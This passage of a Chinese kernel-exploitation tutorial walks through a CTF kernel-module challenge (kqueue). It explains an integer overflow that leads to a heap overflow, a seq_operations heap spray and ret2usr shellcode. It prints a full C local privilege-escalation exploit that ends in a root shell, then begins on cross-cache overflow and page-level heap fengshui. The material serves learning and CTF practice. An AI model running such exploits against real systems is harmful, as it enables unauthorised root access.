request)</span>&#123;<br><br>    <span class="hljs-comment">/* Check for out of bounds queue_idx requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if queue is already saved or not */</span><br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br><br>    <span class="hljs-comment">/* Check if number of requested entries exceed the existing entries */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><br>    <span class="hljs-comment">/* Allocate memory for the kqueue to be saved */</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Each saved entry can have its own size */</span><br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Copy main&#x27;s queue&#x27;s data */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里有个全局数组标识一个 queue 是否 saved 了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> isSaved[MAX_QUEUES] = &#123;<span class="hljs-literal">false</span>&#125;;<br></code></pre></td></tr></table></figure>

<h3 id="③-漏洞利用"><a href="#③-漏洞利用" class="headerlink" title="③ 漏洞利用"></a>③ 漏洞利用</h3><h4 id="Step-I-整数溢出"><a href="#Step-I-整数溢出" class="headerlink" title="Step I.整数溢出"></a>Step I.整数溢出</h4><p>考虑到在 create_queue 中使用 <code>request.max_entries + 1</code> 来进行判定，因此我们可以传入 0xffffffff 使得其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得 <code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p>
<h4 id="Step-II-堆溢出-堆喷射覆写-seq-operations-控制内核执行流"><a href="#Step-II-堆溢出-堆喷射覆写-seq-operations-控制内核执行流" class="headerlink" title="Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流"></a>Step II.堆溢出 + 堆喷射覆写 seq_operations 控制内核执行流</h4><p>前面我们说到在 save_kqueue_entries() 中存在着堆溢出，而在该函数中分配的 object 大小为 queue-&gt;queue_size，即 0x18，应当从 <code>kmalloc-32</code> 中取，那么我们来考虑在该 slab 中可用的结构体</p>
<p>不难想到的是，<strong>seq_operations</strong> 这个结构体同样从 <code>kmalloc-32</code> 中分配，当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code> ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>	<span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>	<span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>	<span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>	<span class="hljs-comment">//...</span><br>	p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p>
<p>那么我们如何保证一定能够溢出到一个 <code>seq_operations</code> 呢？虽然说对于开启了 random freelist 保护（默认开启）的 kernel 而言我们无法直接得知分配的 object 对应的内存布局（<del>glibc这一点就做得很好，平整的内存布局可以让👴直接知道 Pwn 题里分配的每一个 chunk 的位置</del>），但我们可以使用<strong>堆喷射</strong>的手法在内核空间喷射足够多的 seq_operations 结构体布满 vulnerable object 所在的内存附近区域，从而保证我们能够溢出到其中之一</p>
<h4 id="Step-III-ret2usr-ret2shellcode"><a href="#Step-III-ret2usr-ret2shellcode" class="headerlink" title="Step III.ret2usr + ret2shellcode"></a>Step III.ret2usr + ret2shellcode</h4><p>由于没有开启 smep、smap、kpti，故 ret2usr 的攻击手法在本题中是可行的，但是由于开启了 kaslr 的缘故，我们并不知道 prepare_kernel_cred 和 commit_creds 的地址，似乎无法直接执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> </p>
<p>这里 ScuPax0s 师傅给出了一个美妙的解法：通过编写 <strong>shellcode</strong> 在内核栈上找恰当的数据以获得内核基址，执行<code>commit_creds(prepare_kernel_cred(NULL))</code> 并返回到用户态</p>
<h3 id="③-Final-Exploit"><a href="#③-Final-Exploit" class="headerlink" title="③ Final Exploit"></a>③ Final Exploit</h3><p>故最终的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint32_t</span>    max_entries;<br>    <span class="hljs-type">uint16_t</span>    data_size;<br>    <span class="hljs-type">uint16_t</span>    entry_idx;<br>    <span class="hljs-type">uint16_t</span>    queue_idx;<br>    <span class="hljs-type">char</span>*       data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> root_rip;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDEADC0DE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx  = queue_idx,<br>        .entry_idx  = entry_idx,<br>        .data       = data,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xDAADEEEE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req = <br>    &#123;<br>        .queue_idx = queue_idx,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xBADDCAFE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx      = queue_idx,<br>        .max_entries    = max_entries,<br>        .data_size      = data_size,<br>    &#125;;<br>    ioctl(dev_fd, <span class="hljs-number">0xB105BABE</span>, &amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c580;&quot;</span>  <span class="hljs-comment">// prepare_kernel_cred</span><br>        <span class="hljs-string">&quot;add r13, 0x8c140;&quot;</span>  <span class="hljs-comment">// commit_creds</span><br>        <span class="hljs-string">&quot;xor rdi, rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>    );<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span>**envp)</span><br>&#123;<br>    <span class="hljs-type">long</span>        seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span>      *page;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x20</span>];<br><br>    saveStatus();<br>    root_rip = (<span class="hljs-type">size_t</span>) getRootShell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;FAILED to open the dev!&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)<br>        data[i] = (<span class="hljs-type">size_t</span>) shellcode;<br><br>    createQueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span> * <span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, data);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)<br>        read(seq_fd[i], data, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可提权到 root</p>
<p><img src="https://i.loli.net/2021/11/02/oE6vb9nhT1rDwO7.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h2><h2 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h2><p>off-by-one 算是堆溢出里面比较特殊的类型，这里笔者其实是将这一类仅溢出少数字节的堆溢出统称 off-by-one，溢出的不一定只是单个字节，不过比较常见的就是溢出一两个字节，若溢出单个 <code>\x00</code> 字节则称为 off-by-null（比如说在拷贝字符串时容易出现这个问题）</p>
<h3 id="例题：corCTF2022-corjail"><a href="#例题：corCTF2022-corjail" class="headerlink" title="例题：corCTF2022 - corjail"></a>例题：corCTF2022 - corjail</h3><blockquote>
<p>🕊🕊🕊</p>
</blockquote>
<h1 id="0x09-Kernel-Heap-Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui"><a href="#0x09-Kernel-Heap-Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui" class="headerlink" title="0x09. Kernel Heap - Cross-Cache Overflow &amp; Page-level Heap Fengshui"></a>0x09. Kernel Heap - Cross-Cache Overflow &amp; Page-level Heap Fengshui</h1><blockquote>
<p>注：这是两种联合起来的利用手法</p>
</blockquote>
<h2 id="Cross-Cache-Overflow"><a href="#Cross-Cache-Overflow" class="headerlink" title="Cross-Cache Overflow"></a>Cross-Cache Overflow</h2><p>与我们此前一直关注于 slub allocator 的各种利用手法不同，<strong>Cross-Cache Overflow</strong> 实际上是<strong>针对 buddy system</strong> 的利用手法，其主要基于如下思路：</p>
<ul>
<li>slub allocator 底层逻辑是向 buddy system 请求页面后再划分成特定大小 object 返还给上层调用者<ul>
<li>→ 内存中用作不同 <code>kmem_cache</code> 的页面在内存上是有可能相邻的</li>
</ul>
</li>
<li>若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A、B两页面相邻，则我们便有可能实现跨越不同 <code>kmem_cache</code> 之间的堆溢出</li>
</ul>
<p><img src="https://s2.loli.net/2023/02/07/5swQX76l8r9Dqb1.png" srcset="/img/loading.gif" lazyload alt="cross-cache overflow.png"></p>
<p><strong>Cross-Cache Overflow 打破了不同 kmem_cache 之间的阻碍，可以让我们的溢出漏洞对近乎任意的内核结构体进行覆写</strong></p>
<p>但这需要达成非常严苛的页级堆排布，而内核的堆页面布局对我们而言通常是未知的，因此我们需要想办法将其变为已知的内存布局，这就需要<strong>页级堆风水</strong>——</p>
<h2 id="Page-level-Heap-Fengshui"><a href="#Page-level-Heap-Fengshui" class="headerlink" title="Page-level Heap Fengshui"></a>Page-level Heap Fengshui</h2><p>顾名思义，<strong>页级堆风水</strong>即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们<strong>手工构造一个新的已知的页级粒度内存页排布</strong></p>
<p>首先让我们重新审视 slub allocator 向 buddy system 请求页面的过程，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p>
<p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>接下来让我们重新审视 buddy system ，其基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p>
<p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" srcset="/img/loading.gif" lazyload alt="page.gif"></p>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li>
</ul>
<p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong></p>
<h3 id="使用-setsockopt-与-pgv-完成页级内存占位与堆风水"><a href="#使用-setsockopt-与-pgv-完成页级内存占位与堆风水" class="headerlink" title="使用 setsockopt 与 pgv 完成页级内存占位与堆风水"></a>使用 setsockopt 与 pgv 完成页级内存占位与堆风水</h3><p>那么我们该如何完成这样的页占位与页排布呢？笔者这里给出一个来自于 <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> 的方案：</p>
<p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    	packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    		packet_set_ring()<br>    			alloc_pg_vec()<br></code></pre></td></tr></table></figure>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2<sup>order</sup> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br>	<span class="hljs-type">int</span> i;<br><br>	pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>		pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br>		<span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br>			<span class="hljs-keyword">goto</span> out_free_pgvec;<br>	&#125;<br><br>out:<br>	<span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>	free_pg_vec(pg_vec, order, block_nr);<br>	pg_vec = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
